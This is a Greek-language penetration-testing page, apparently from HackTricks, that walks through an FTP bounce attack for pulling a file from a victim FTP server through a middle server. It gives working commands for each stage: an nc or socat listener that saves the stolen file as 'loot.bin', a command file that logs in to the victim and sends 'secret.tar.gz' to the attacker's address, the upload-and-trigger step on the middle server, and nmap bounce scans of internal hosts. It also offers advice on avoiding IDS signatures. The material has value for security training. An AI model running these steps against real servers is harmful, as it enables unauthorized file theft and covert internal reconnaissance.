# FTP Bounce Download 2 of FTP File

{{#include ../../banners/hacktricks-training.md}}


## Περίληψη

Εάν έχετε πρόσβαση σε έναν **bounce FTP server**, μπορείτε να τον αναγκάσετε να ζητήσει αρχεία από **another FTP server** (όπου γνωρίζετε κάποια διαπιστευτήρια) και να κατεβάσετε αυτό το αρχείο στον **δικό σας server**.

## Απαιτήσεις

- Έγκυρα διαπιστευτήρια FTP στο **FTP Middle server**
- Έγκυρα διαπιστευτήρια FTP στο **Victim FTP server**
- Και οι δύο διακομιστές **αποδέχονται την εντολή `PORT`** (bounce FTP attack)
- Μπορείτε να **γράψετε** μέσα σε κάποιον κατάλογο του **FTP Middle server**
- Ο middle server έχει **περισσότερη πρόσβαση** μέσα στον Victim FTP Server απ' ό,τι εσείς

## Βήματα

1. Συνδεθείτε στο **δικό σας FTP server** και κάντε τη σύνδεση passive (`pasv` command) ώστε να **ακούει** σε έναν κατάλογο όπου η υπηρεσία του Victim θα στείλει το αρχείο.
2. Δημιουργήστε το αρχείο που θα στείλει ο FTP Middle server στον Victim server (το **exploit script**). Αυτό το αρχείο θα είναι απλό κείμενο με τις απαραίτητες εντολές για να αυθεντικοποιηθεί απέναντι στον Victim server, να αλλάξει κατάλογο και να κατεβάσει ένα αρχείο στον δικό σας server.
3. Συνδεθείτε στον **FTP Middle Server** και ανεβάστε το προηγούμενο αρχείο.
4. Κάντε τον FTP Middle server να **εγκαθιδρύσει σύνδεση** με τον Victim server και να στείλει το exploit αρχείο.
5. **Πιάστε** το αρχείο στον δικό σας FTP server.
6. **Διαγράψτε** το exploit αρχείο από τον FTP Middle server.

## Γρήγορος έλεγχος για ευάλωτους bounce hosts

- Το **Nmap** εξακολουθεί να υποστηρίζει ελέγχους FTP bounce. Παράδειγμα για να επαληθεύσετε έναν πιθανό middle server:
```bash
nmap -Pn -p21 --script ftp-bounce <middle_ftp_ip>
# or directly attempt a bounce scan
nmap -Pn -p80 -b user:pass@<middle_ftp_ip>:21 <internal_target_ip>
```
Εάν ο server αρνηθεί τιμές `PORT` τρίτων, η σάρωση θα αποτύχει· κάποιοι embedded/legacy εκτυπωτές, NAS και appliance FTP daemons εξακολουθούν να το επιτρέπουν.

## Αυτοματοποίηση της 2ης λήψης FTP

Παρακάτω είναι ένας εκσυγχρονισμένος τρόπος να τραβήξετε ένα αρχείο μέσω ενός ευάλωτου middle FTP server.

1. **Άνοιξε έναν παθητικό listener** στο attack box σου (οποιοδήποτε TCP sink λειτουργεί):
```bash
nc -lvnp 2121 > loot.bin  # or run a small pyftpdlib server
```

2. **Σημείωσε** το IP σου ως `A,B,C,D` και την πόρτα `P` ως `p1,p2` (`p1 = P/256`, `p2 = P%256`).

3. **Δημιούργησε το αρχείο εντολών** που ο middle server θα αναπαράγει προς το θύμα:
```bash
cat > instrs <<'EOF'
USER <victim_user>
PASS <victim_pass>
CWD /path/inside/victim
TYPE I
PORT A,B,C,D,p1,p2
RETR secret.tar.gz
QUIT
EOF
# Add padding so the control channel stays open on picky daemons
dd if=/dev/zero bs=1024 count=60 >> instrs
```

4. **Ανέβασε & ενεργοποίησε από τον middle server** (κλασικό proxy FTP):
```bash
ftp -n <middle_ftp> <<'EOF'
user <middle_user> <middle_pass>
put instrs
PORT <victim_ip_with_commas>,0,21
RETR instrs
QUIT
EOF
```

5. **Πάρε το αρχείο** από τον listener σου (`loot.bin`).
6. **Καθάρισε** το ανεβασμένο αρχείο `instrs` στον middle server.

Σημειώσεις:
- Το padding (`dd ...`) αποτρέπει το κλείσιμο της control σύνδεσης πριν ολοκληρωθεί το RETR (ζήτημα με μεγάλο TCP window που συζητείται σε κλασικά writeups).
- Οποιαδήποτε υπηρεσία που μπορεί να **listen and dump TCP** μπορεί να αντικαταστήσει το FTP PASV socket (π.χ., `socat -u TCP-LISTEN:2121,fork - > loot.bin`).
- Εάν ο middle server περιορίζει privileged ports, χρησιμοποίησε υψηλή πόρτα στο `PORT` και προσαρμόσε ανάλογα τον listener σου.

## Επιπλέον κόλπα

- Χρησιμοποίησε έναν bounceable FTP server για **port-scan internal hosts** όταν το file relay είναι μπλοκαρισμένο:
```bash
nmap -Pn -p22,80,445 -b anonymous:<email>@<middle_ftp> <internal_ip>
```
- Κάποια σύγχρονα WAF/IDS (π.χ., Juniper IPS) περιλαμβάνουν signatures ειδικά για **FTP:EXPLOIT:BOUNCE-ATTACK**· θορυβώδη payloads ή απουσία padding μπορεί να τα ενεργοποιήσουν.
- Όταν ο middle server επιβάλει περιορισμούς «PORT to same host», τοποθέτησε τον **listener στον ίδιο τον middle server** (αν έχεις write/execute) και προώθησε το καταγεγραμμένο αρχείο αργότερα.

Για πιο λεπτομερή old-school walkthrough δες: [http://www.ouah.org/ftpbounce.html](http://www.ouah.org/ftpbounce.html)




## Αναφορές

- [Nmap book – TCP FTP Bounce Scan (-b)](https://nmap.org/book/scan-methods-ftp-bounce-scan.html)
- [CPTS Attacking Common Services – FTP Bounce example (2025)](https://www.chaostudy.com/2025/02/24/cpts-attacking-common-services/)
{{#include ../../banners/hacktricks-training.md}}
